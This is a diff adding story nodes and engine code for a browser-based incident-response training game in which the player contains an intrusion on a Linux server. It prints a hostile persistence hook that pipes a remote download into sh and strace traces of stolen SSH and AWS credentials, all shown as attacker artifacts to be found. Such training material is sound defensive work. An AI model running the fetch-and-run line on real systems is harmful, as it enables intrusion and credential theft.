+  - Privilege escalation
+  - Data exfiltration
+  - Persistent backdoor
+  - Anti-forensics
+
+<span class="purple">This is bigger than you thought.</span>
+
+You're dealing with advanced persistent threat actors.`,
+                choices: [
+                    { text: 'This is above my pay grade. Full response now.', next: 'coordinated_action', suspicion: 0 },
+                    { text: 'Check for more indicators of compromise', next: 'check_more_iocs', suspicion: 10 },
+                    { text: 'Document everything before cleanup', next: 'copy_evidence', suspicion: 5 }
+                ]
+            },
+
+            bad_move_1: {
+                text: `
+<span class="prompt">root@compromised:~#</span> rm -rf /tmp/*
+
+<span class="alert">ERROR: This is a production server!</span>
+
+You just deleted:
+- Active session files
+- Application temporary data
+- System lock files
+- <span class="warning">THE EVIDENCE</span>
+
+<span class="prompt">root@compromised:~#</span> ls /tmp/
+
+(empty)
+
+The attacker's backdoor is gone.
+But so is all forensic evidence.
+And your application just crashed.
+
+<span class="alert">[EMAIL] CEO: "Why is the website down at 3 AM?"</span>
+<span class="alert">[SLACK] DevOps: "Database locks are corrupted!"</span>
+<span class="alert">[ALERT] Monitoring: 17 services failed</span>
+
+You caused more damage than the attacker.
+
+<span class="purple">GAME OVER: Catastrophic operational error</span>`,
+                choices: [
+                    { text: 'Restart from beginning', next: 'intro', suspicion: 0 }
+                ]
+            },
+
+            bad_move_2: {
+                text: `
+<span class="prompt">root@compromised:~#</span> shutdown -h now
+
+Broadcast message from root@compromised (pts/0) (Mon Jan 15 03:15:42 2026):
+
+The system is going down for system halt NOW!
+
+<span class="alert">[CRITICAL] Emergency shutdown initiated</span>
+
+3:16 AM - Your phone explodes with notifications:
+
+<span class="alert">[PAGERDUTY] CRITICAL: prod-server-03 DOWN</span>
+<span class="alert">[SLACK] @channel PRODUCTION OUTAGE</span>
+<span class="alert">[PHONE] CEO calling...</span>
+
+You shut down a production server serving 10,000 active users.
+No coordination. No failover. No backup.
+
+The attacker's process is stopped.
+But so is $50,000/hour in revenue.
+
+Your phone rings. It's the CEO.
+
+"You better have a good explanation."
+
+<span class="purple">GAME OVER: Uncoordinated emergency response</span>
+
+(In incident response, the cure must not be worse than the disease)`,
+                choices: [
+                    { text: 'Restart from beginning', next: 'intro', suspicion: 0 }
+                ]
+            },
+
+            delete_evidence: {
+                text: `
+<span class="prompt">root@compromised:~#</span> rm -rf /tmp/...systemd-cache/
+
+rm: cannot remove '/tmp/...systemd-cache/systemd-cache': Text file busy
+rm: cannot remove '/tmp/...systemd-cache/.keylog': Text file busy
+
+<span class="alert">[ERROR] Process has files open</span>
+
+<span class="prompt">root@compromised:~#</span> rm -rf /tmp/...systemd-cache/.exfil
+
+<span class="warning">[!] You just deleted staged exfiltration data</span>
+
+But the process immediately detects the deletion:
+
+<span class="prompt">root@compromised:~#</span> lsof -p 17384 | grep exfil
+
+(file handle closed)
+
+<span class="alert">[ALERT] Attacker detected interference</span>
+
+On their terminal:
+> ERROR: Staging file deleted
+> <span class="alert">DEFENSIVE MODE ACTIVATED</span>
+> Purging logs...
+> Removing evidence...
+> Covering tracks...
+
+You tipped them off without stopping them.
+
+<span class="purple">SUSPICION MAXED OUT</span>
+
+The binary springs into action, erasing its presence.`,
+                choices: [
+                    { text: 'Try to kill the process quickly', next: 'kill_process_alerted', suspicion: 0 },
+                    { text: 'Watch helplessly as evidence vanishes', next: 'ending_escape', suspicion: 0 }
+                ]
+            },
+
+            continue_monitoring: {
+                text: `
+You decide to keep watching. Gather more intelligence.
+
+<span class="prompt">root@compromised:~#</span> strace -p 17384 2>&1 | tee /root/strace.log
+
+open("/etc/passwd", O_RDONLY)           = 9
+read(9, "root:x:0:0:root:/root...", 4096) = 2156
+<span class="alert">open("/root/.ssh/id_rsa", O_RDONLY)     = 10</span>
+read(10, "-----BEGIN OPENSSH...", 4096)  = 3381
+write(6, "-----BEGIN OPENSSH...", 3381)  = 3381
+<span class="warning">sendto(4, "\\x17\\x03\\x03\\x0d...", 3386, 0, NULL, 0) = 3386</span>
+
+<span class="alert">open("/home/admin/.aws/credentials", O_RDONLY) = 11</span>
+read(11, "[default]\\naws_access...", 2048) = 178
+write(6, "[default]\\naws_access...", 178) = 178
+sendto(4, "\\x17\\x03\\x03\\x00\\xb7...", 188, 0, NULL, 0) = 188
+
+<span class="alert">THEY'RE TAKING YOUR AWS CREDENTIALS!</span>
+
+10 seconds pass. 20 seconds. 30 seconds.
+
+<span class="alert">open("/var/www/config/database.yml", O_RDONLY) = 12</span>
+read(12, "production:\\n  adapter: postg...", 1024) = 512
+
+Every second you watch, more data leaks.
+Root SSH keys. AWS credentials. Database configs.
+
+<span class="purple">CRITICAL: Waiting too long has consequences</span>`,
+                choices: [
+                    { text: 'STOP NOW. Kill everything.', next: 'emergency_stop', suspicion: 0 },
+                    { text: 'I need more evidence... keep watching', next: 'monitoring_failure', suspicion: 0 }
+                ]
+            },
+
+            emergency_stop: {
+                text: `
+<span class="alert">ENOUGH.</span>
+
+<span class="prompt">root@compromised:~#</span> kill -9 17384 17385 && iptables -A OUTPUT -d 45.33.32.156 -j DROP
+
+<span class="success">Process killed. Network blocked.</span>
+
+You act fast and decisive. The hemorrhaging stops.
+
+<span class="prompt">root@compromised:~#</span> crontab -r && crontab -r -u www-data
+
+<span class="success">Persistence removed.</span>
+
+<span class="prompt">root@compromised:~#</span> rm -rf /tmp/...systemd-cache/
+
+<span class="success">Binary deleted.</span>
+
+You check the logs one more time:
+
+<span class="prompt">root@compromised:~#</span> tail /root/strace.log
+
+The last operation before you killed it:
+sendto(4, "\\x17\\x03\\x03\\x00\\xb7...", 188, 0, NULL, 0) = 188
+
+<span class="warning">AWS credentials were transmitted.</span>
+
+You stopped them, but not before they got:
+- Root SSH private key
+- AWS access credentials
+- Database configuration
+
+Damage done, but contained before total compromise.`,
+                choices: [
+                    { text: 'Assess the damage', next: 'ending_partial_victory', suspicion: 0 }
+                ]
+            },
+
+            monitoring_failure: {
+                text: `
+You decide to wait. Gather more data.
+
+5 minutes pass...
+
+<span class="alert">[ALERT] Unusual AWS activity detected</span>
+<span class="alert">[ALERT] EC2 instances launched in eu-west-1</span>
+<span class="alert">[ALERT] S3 bucket enumeration detected</span>
+
+10 minutes pass...
+
+<span class="alert">[ALERT] Database connections from unknown IP</span>
+<span class="alert">[ALERT] Backup server SSH connection from 45.33.32.156</span>
+
+15 minutes pass...
+
+<span class="alert">[CRITICAL] Customer data accessed</span>
+<span class="alert">[CRITICAL] GDPR breach threshold exceeded</span>
+
+Your phone rings. Security Operations Center.
+
+"We're seeing unauthorized access across the entire infrastructure.
+What's happening on prod-03?"
+
+You watched too long.
+The attacker pivoted to other systems.
+What started as a single compromised server became a full breach.
+
+<span class="purple">GAME OVER: Analysis paralysis</span>
+
+(In incident response, speed matters. Don't let perfect be the enemy of good.)`,
+                choices: [
+                    { text: 'Restart from beginning', next: 'intro', suspicion: 0 }
+                ]
+            },
+
+            check_authorized_keys: {
+                text: `
+<span class="prompt">root@compromised:~#</span> cat /var/www/.ssh/authorized_keys
+
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC8hK... admin@workstation
+<span class="alert">ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDj9P... attacker@unknown</span>
+ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGq8... deploy@jenkins
+
+<span class="prompt">root@compromised:~#</span> ssh-keygen -lf /var/www/.ssh/authorized_keys
+
+2048 SHA256:Xj8k9mLp2QrYv3nD7cF4wG5tK (RSA) admin@workstation
+<span class="alert">4096 SHA256:Bx2k7vNm9Lp4Qq6Wc5Yb8Zt3D (RSA) attacker@unknown</span>
+256 SHA256:Kf3j8Nm6Lq9Pr5Vc2Mb7Xt4G (ED25519) deploy@jenkins
+
+<span class="alert">[!] ROGUE SSH KEY IDENTIFIED</span>
+
+<span class="prompt">root@compromised:~#</span> grep -r "Xj8k9mLp2QrYv3nD7cF4wG5tK" /var/log/auth.log
+
+Jan 15 01:52:14 prod-03 sshd[15891]: Accepted publickey for www-data from 203.0.113.45 port 54892 ssh2: RSA <span class="alert">SHA256:Xj8k9mLp2QrYv3nD7cF4wG5tK</span>
+
+That's how they got in initially.
+
+The key was added December 28th (backdoor planted weeks ago).
+They waited 18 days before activating their attack.
+
+<span class="purple">SOPHISTICATED: This was planned, not opportunistic</span>`,
+                choices: [
+                    { text: 'Remove the rogue key', next: 'remove_ssh_key', suspicion: 10 },
+                    { text: 'Check for more backdoors', next: 'check_more_iocs', suspicion: 5 },
+                    { text: 'Execute full response plan', next: 'coordinated_action', suspicion: 0 }
+                ]
+            },
+
+            remove_ssh_key: {
+                text: `
+<span class="prompt">root@compromised:~#</span> sed -i '/attacker@unknown/d' /var/www/.ssh/authorized_keys
+
+<span class="success">[OK] Rogue SSH key removed</span>
+
+<span class="prompt">root@compromised:~#</span> cat /var/www/.ssh/authorized_keys
+
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC8hK... admin@workstation
+ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGq8... deploy@jenkins
+
+The backdoor entry point is closed.
+
+But the attacker is already inside, running as root.
+Closing the door doesn't remove the intruder from the house.
+
+<span class="prompt">root@compromised:~#</span> w
+
+ 03:22:15 up 47 days,  4:35,  3 users,  load average: 0.45, 0.32, 0.28
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+root     pts/0    10.0.1.100       02:47    0.00s  0.12s  0.03s w
+admin    pts/1    10.0.1.101       01:23   32:18   0.08s  0.08s -bash
+<span class="alert">www-data pts/2    203.0.113.45     01:52   15:23   0.00s  0.00s /bin/bash</span>
+
+<span class="alert">THEY'RE STILL LOGGED IN!</span>
+
+The attacker has an active shell session.
+They can see you working.
+
+Every command you type appears in their terminal history.`,
+                choices: [
+                    { text: 'pkill -KILL -u www-data (kill all www-data sessions)', next: 'kill_sessions', suspicion: 25 },
+                    { text: 'Full coordinated response NOW', next: 'coordinated_action', suspicion: 15 },
+                    { text: 'Monitor their session to see what they do', next: 'watch_attacker', suspicion: 10 }
+                ]
+            },
+
+            check_more_iocs: {
+                text: `
+<span class="prompt">root@compromised:~#</span> find / -type f -mtime -1 -ls 2>/dev/null | grep -v "/proc\\|/sys"
+
+-rwxr-xr-x 1 root root 287456 Jan 15 02:30 /tmp/...systemd-cache/systemd-cache
+-rw-r--r-- 1 root root  45312 Jan 15 02:31 /tmp/...systemd-cache/.keylog
+-rw-r--r-- 1 root root   8192 Jan 15 02:46 /tmp/...systemd-cache/.exfil
+<span class="alert">-rwxr-xr-x 1 root root   2048 Jan 15 01:54 /usr/local/bin/.update-daemon</span>
+<span class="alert">-rwxr-xr-x 1 root root   4096 Jan 15 01:55 /lib/systemd/system-sleep/suspend-hook</span>
+<span class="warning">-rw------- 1 root root    512 Jan 15 02:15 /root/.bash_history</span>
+
+<span class="alert">[!] ADDITIONAL BACKDOORS FOUND!</span>
+
+<span class="prompt">root@compromised:~#</span> file /usr/local/bin/.update-daemon
+
+/usr/local/bin/.update-daemon: ELF 64-bit LSB executable, x86-64
+
+<span class="prompt">root@compromised:~#</span> strings /usr/local/bin/.update-daemon | grep -i connect
+
+connect_to_c2()
+fallback_channel()
+<span class="alert">198.51.100.78:8443</span>
+
+<span class="prompt">root@compromised:~#</span> cat /lib/systemd/system-sleep/suspend-hook
+
+#!/bin/bash
+curl -s http://45.33.32.156/beacon | sh &
+/tmp/...systemd-cache/systemd-cache --daemon &
+
+<span class="alert">MULTIPLE PERSISTENCE MECHANISMS!</span>
+
+This isn't just a rootkit. It's a full implant framework.
+- Backup C2 binary in /usr/local/bin
+- System sleep/resume hook
+- Multiple callback channels
+
+They're not taking chances.`,
+                choices: [
+                    { text: 'Document everything', next: 'full_documentation', suspicion: 5 },
+                    { text: 'Clean all backdoors immediately', next: 'full_cleanup', suspicion: 20 },
+                    { text: 'This is too deep. Call in the experts.', next: 'call_experts', suspicion: 0 }
+                ]
+            },
+
+            full_cleanup: {
+                text: `
+<span class="prompt">root@compromised:~#</span> # Comprehensive eradication
+
+<span class="success">Killing processes...</span>
+<span class="prompt">root@compromised:~#</span> killall -9 systemd-cache update-daemon
+
+<span class="success">Blocking C2 infrastructure...</span>
+<span class="prompt">root@compromised:~#</span> iptables -A OUTPUT -d 45.33.32.156 -j DROP
+<span class="prompt">root@compromised:~#</span> iptables -A OUTPUT -d 198.51.100.78 -j DROP
+
+<span class="success">Removing backdoors...</span>
+<span class="prompt">root@compromised:~#</span> rm -rf /tmp/...systemd-cache/
+<span class="prompt">root@compromised:~#</span> rm -f /usr/local/bin/.update-daemon
+<span class="prompt">root@compromised:~#</span> rm -f /lib/systemd/system-sleep/suspend-hook
+
+<span class="success">Removing persistence...</span>
+<span class="prompt">root@compromised:~#</span> crontab -l | grep -v systemd-cache | crontab -
+<span class="prompt">root@compromised:~#</span> crontab -r -u www-data
+
+<span class="success">Closing backdoor access...</span>
+<span class="prompt">root@compromised:~#</span> sed -i '/attacker@unknown/d' /var/www/.ssh/authorized_keys
+
+<span class="success">Rotating credentials...</span>
+<span class="prompt">root@compromised:~#</span> passwd root
+<span class="prompt">root@compromised:~#</span> passwd admin
+<span class="prompt">root@compromised:~#</span> passwd www-data
+
+<span class="prompt">root@compromised:~#</span> ps aux | grep -E 'systemd-cache|update-daemon'
+
+root     19234  0.0  0.1   8192  2048 pts/0 S+  03:35   0:00 grep --color=auto -E systemd-cache|update-daemon
+
+<span class="success">CLEAN.</span>
+
+The infection is purged. System secured.`,
+                choices: [
+                    { text: 'Generate final report', next: 'ending_victory', suspicion: 0 }
+                ]
+            },
+
+            ending_victory: {
+                text: `
+<span class="success">====================================</span>
+<span class="success">  INCIDENT SUCCESSFULLY CONTAINED</span>
+<span class="success">====================================</span>
+
+<span class="prompt">root@compromised:~#</span> cat /root/incident-report.txt
+
+INCIDENT RESPONSE SUMMARY
+Date: 2026-01-15 02:47 - 03:45
+Duration: 58 minutes
+Status: <span class="success">THREAT ELIMINATED</span>
+
+THREAT ACTOR PROFILE:
+- APT-C-78 "ShadowRoot" toolkit
+- Nation-state level sophistication
+- Multiple persistence mechanisms
+- C2 infrastructure: 45.33.32.156, 198.51.100.78
+
+ACTIONS TAKEN:
+✓ Backdoor processes terminated
+✓ C2 communications blocked
+✓ Persistence mechanisms removed
+✓ SSH backdoors closed
+✓ Credentials rotated
+✓ Evidence preserved for forensics
+
+DAMAGE ASSESSMENT:
+- Password hashes exfiltrated (rotated)
+- SSH keys compromised (regenerated)
+- 24 minutes of keystroke logging
+- Database credentials stolen (changed)
+
+RECOMMENDATIONS:
+1. Full security audit
+2. Enhanced monitoring
+3. MFA enforcement
+4. Principle of least privilege review
+5. Network segmentation
+
+You handled it professionally.
+Evidence secured. Threat neutralized.
+No operational downtime.
+
+<span class="purple">The CEO sends an email:</span>
+"Outstanding work. You saved us from a catastrophic breach.
+Consider this a career-defining moment."
+
+<span class="success">== ACHIEVEMENT UNLOCKED: ROOT HUNTER ==</span>
+<span class="purple">+50 XP</span>
+
+[System secure. The sun rises on a safer infrastructure.]
+
+<span class="prompt">root@compromised:~#</span> █`,
+                choices: [
+                    { text: 'Play again', next: 'intro', suspicion: 0 }
+                ]
+            },
+
+            ending_contained: {
+                text: `
+<span class="warning">====================================</span>
+<span class="warning">  THREAT CONTAINED (EVIDENCE LOST)</span>
+<span class="warning">====================================</span>
+
+<span class="prompt">root@compromised:~#</span> cat /root/incident-summary.txt
+
+INCIDENT RESPONSE SUMMARY
+Date: 2026-01-15
+Status: <span class="warning">CONTAINED BUT INCOMPLETE</span>
+
+The backdoor has been neutralized.
+The attacker's access is revoked.
+Your system is secure.
+
+But...
+
+The evidence is gone.
+The forensic trail is cold.
+You don't know what they took.
+You can't prove attribution.
+No way to prosecute.
+
+You stopped the bleeding, but lost the patient's medical history.
+
+LESSONS LEARNED:
+- Evidence preservation is critical
+- React methodically, not impulsively
+- Document before destroying
+- Forensics enables learning
+
+The security team has questions you can't answer:
+"What data was exfiltrated?"
+"How long were they in the system?"
+"Are there other compromised servers?"
+
+<span class="warning">You did okay. But you could have done better.</span>
+
+<span class="purple">+25 XP (Partial Success)</span>
+
+[The attacker vanishes into the dark web, identity unknown...]
+
+<span class="prompt">root@compromised:~#</span> █`,
+                choices: [
+                    { text: 'Play again', next: 'intro', suspicion: 0 }
+                ]
+            },
+
+            ending_escape: {
+                text: `
+<span class="alert">====================================</span>
+<span class="alert">     ATTACKER ESCAPED CLEANLY</span>
+<span class="alert">====================================</span>
+
+You watch helplessly as the logs disappear:
+
+<span class="prompt">root@compromised:~#</span> ls -la /tmp/...systemd-cache/
+
+ls: cannot access '/tmp/...systemd-cache/': No such file or directory
+
+<span class="prompt">root@compromised:~#</span> history
+
+(cleared)
+
+<span class="prompt">root@compromised:~#</span> tail -n 100 /var/log/auth.log | grep "203.0.113.45"
+
+(no results)
+
+The attacker triggered their self-destruct protocol:
+- All binaries wiped
+- Keystroke logs destroyed
+- Network logs scrubbed
+- Bash history cleared
+- SSH keys removed
+- Cron jobs deleted
+
+They left nothing behind.
+
+<span class="alert">POST-INCIDENT ANALYSIS:</span>
+
+You know you were compromised.
+You don't know what was taken.
+You don't know how deep they were.
+You don't know if they're truly gone.
+
+"Did we get everything?"
+The question haunts your team for months.
+
+Security through uncertainty is no security at all.
+
+<span class="alert">GAME OVER: Attacker escaped with data and identity intact</span>
+
+<span class="purple">+10 XP (Lessons Learned)</span>
+
+[Three weeks later, your AWS bill shows $47,000 in unauthorized EC2 usage...]
+
+<span class="prompt">root@compromised:~#</span> █`,
+                choices: [
+                    { text: 'Play again', next: 'intro', suspicion: 0 }
+                ]
+            },
+
+            ending_partial_victory: {
+                text: `
+<span class="warning">====================================</span>
+<span class="warning">  PARTIAL VICTORY: DAMAGE LIMITED</span>
+<span class="warning">====================================</span>
+
+<span class="prompt">root@compromised:~#</span> cat /root/damage-report.txt
+
+INCIDENT RESPONSE ASSESSMENT
+Status: <span class="success">THREAT NEUTRALIZED</span>
+Damage Level: <span class="warning">MODERATE</span>
+
+COMPROMISED ASSETS:
+<span class="alert">✗ Root SSH private key</span>
+<span class="alert">✗ AWS access credentials</span>
+<span class="alert">✗ Database configuration</span>
+<span class="success">✓ Customer data (not accessed)</span>
+<span class="success">✓ Backup systems (isolated)</span>
+<span class="success">✓ Financial records (secure)</span>
+
+IMMEDIATE ACTIONS REQUIRED:
+1. Rotate all AWS credentials
+2. Regenerate SSH keys
+3. Update database passwords
+4. Audit all AWS resources for unauthorized usage
+5. Review CloudTrail logs
+
+ESTIMATED IMPACT:
+- 2 hours emergency maintenance
+- $5,000 in compromised AWS resources
+- No customer data breach
+- No reputational damage
+
+You stopped them before catastrophic damage.
+Yes, they got some credentials.
+Yes, you'll have cleanup work.
+
+But you prevented:
+- Customer data exfiltration
+- Lateral movement to other servers
+- Ransomware deployment
+- Long-term persistence
+
+<span class="success">You contained a sophisticated attack.</span>
+
+Could have been better.
+Could have been MUCH worse.
+
+<span class="purple">+35 XP (Competent Response)</span>
+
+[The attack made you stronger. Next time, you'll be ready faster.]
+
+<span class="prompt">root@compromised:~#</span> █`,
+                choices: [
+                    { text: 'Play again', next: 'intro', suspicion: 0 }
+                ]
+            }
+        };
+
+        // ===== GAME ENGINE =====
+        const GameEngine = {
+            init() {
+                AudioEngine.init();
+                this.showNode(GameState.currentNode);
+            },
+
+            async showNode(nodeId) {
+                GameState.currentNode = nodeId;
+                GameState.visitedNodes.push(nodeId);
+
+                const node = StoryNodes[nodeId];
+                const terminal = document.getElementById('terminal');
+
+                // Clear terminal for new node
+                terminal.innerHTML = '';
+
+                // Typewriter effect for text
+                await this.typewriterText(node.text, terminal);
+
+                // Show choices if any
+                if (node.choices && node.choices.length > 0) {
+                    await this.showChoices(node.choices, terminal);
+                }
+
+                // Check for endings
+                if (nodeId.startsWith('ending_')) {
+                    this.handleEnding(nodeId);
+                }
+            },
+
+            async typewriterText(text, container) {
+                const lines = text.split('\n');
+
+                for (const line of lines) {
+                    const lineDiv = document.createElement('div');
+                    lineDiv.className = 'output-line';
+                    lineDiv.innerHTML = line;
+                    container.appendChild(lineDiv);
+
+                    // Slight delay between lines
+                    await this.sleep(20);
+
+                    // Play typing sound occasionally
+                    if (Math.random() > 0.7) {
+                        AudioEngine.typewriterClick();
+                    }
+
+                    // Scroll to bottom
+                    window.scrollTo(0, document.body.scrollHeight);
+                }
+
+                await this.sleep(300);
+            },
+
+            async showChoices(choices, container) {
+                const choicesDiv = document.createElement('div');
+                choicesDiv.className = 'choices';
+
+                const promptDiv = document.createElement('div');
+                promptDiv.className = 'prompt';
+                promptDiv.innerHTML = 'root@compromised:~# <span class="purple">Choose action:</span>';
+                choicesDiv.appendChild(promptDiv);
+
+                choices.forEach((choice, index) => {
+                    const choiceDiv = document.createElement('div');
+                    choiceDiv.className = 'choice';
+                    choiceDiv.innerHTML = `<span class="choice-number">[${index + 1}]</span> ${choice.text}`;
+                    choiceDiv.onclick = () => this.makeChoice(choice);
+                    choicesDiv.appendChild(choiceDiv);
+                });
+
+                container.appendChild(choicesDiv);
+
+                // Add blinking cursor
+                const cursorSpan = document.createElement('span');
+                cursorSpan.className = 'cursor';
+                cursorSpan.innerHTML = '█';
+                container.appendChild(cursorSpan);
+
+                window.scrollTo(0, document.body.scrollHeight);
+            },
+
+            makeChoice(choice) {
+                // Update suspicion
+                this.updateSuspicion(choice.suspicion);
+
+                // Play sound based on suspicion change
+                if (choice.suspicion > 20) {
+                    AudioEngine.alertSting();
+                    document.body.classList.add('flicker');
+                    setTimeout(() => document.body.classList.remove('flicker'), 300);
+                } else if (choice.suspicion > 0) {
+                    AudioEngine.typewriterClick();
+                }
+
+                // Check if suspicion maxed out
+                if (GameState.suspicion >= GameState.maxSuspicion) {
+                    this.showNode('ending_escape');
+                } else {
+                    this.showNode(choice.next);
+                }
+            },
+
+            updateSuspicion(amount) {
+                GameState.suspicion = Math.min(GameState.maxSuspicion, Math.max(0, GameState.suspicion + amount));
+
+                const percentage = (GameState.suspicion / GameState.maxSuspicion) * 100;
+                const meterFill = document.getElementById('meter-fill');
+                meterFill.style.width = percentage + '%';
+
+                if (percentage > 70) {
+                    meterFill.classList.add('danger');
+                } else {
+                    meterFill.classList.remove('danger');
+                }
+
+                // Update status text
+                const statusText = document.getElementById('status-text');
+                if (percentage > 80) {
+                    statusText.textContent = 'COMPROMISED';
+                    statusText.className = 'alert';
+                    AudioEngine.heartbeat();
+                } else if (percentage > 50) {
+                    statusText.textContent = 'ALERTED';
+                    statusText.className = 'warning';
+                } else {
+                    statusText.textContent = 'ACTIVE';
+                    statusText.className = 'success';
+                }
+            },
+
+            handleEnding(endingId) {
+                GameState.gameEnded = true;
+
+                if (endingId === 'ending_victory') {
+                    AudioEngine.successChime();
+                    this.awardXP();
+                } else if (endingId === 'ending_partial_victory') {
+                    AudioEngine.successChime();
+                } else if (endingId === 'ending_contained') {
+                    AudioEngine.alertSting();
+                } else {
+                    AudioEngine.glitchSound();
+                }
+            },
+
+            awardXP() {
+                if (localStorage.getItem('game_sudo_xp_awarded')) return;
+                localStorage.setItem('game_sudo_xp_awarded', 'true');
+                let xp = parseInt(localStorage.getItem('hexworth_xp') || '0');
+                xp += 50;
+                localStorage.setItem('hexworth_xp', xp.toString());
+                if (window.FirestoreManager) {
+                    const uid = localStorage.getItem('hexworth_uid');
+                    if (uid) FirestoreManager.addXP(uid, 50, 'sudo su');
+                }
+                if (window.AchievementManager) AchievementManager.unlock('game_sudo');
+            },
+
+            sleep(ms) {
+                return new Promise(resolve => setTimeout(resolve, ms));
+            }
+        };
+
+        // ===== START GAME =====
+        window.addEventListener('DOMContentLoaded', () => {
+            GameEngine.init();
+        });
+    </script>
+
+    <script src="../../../components/FluxCapacitor.js"></script>
+    <script src="../../../components/AchievementManager.js"></script>
+</body>
+</html>
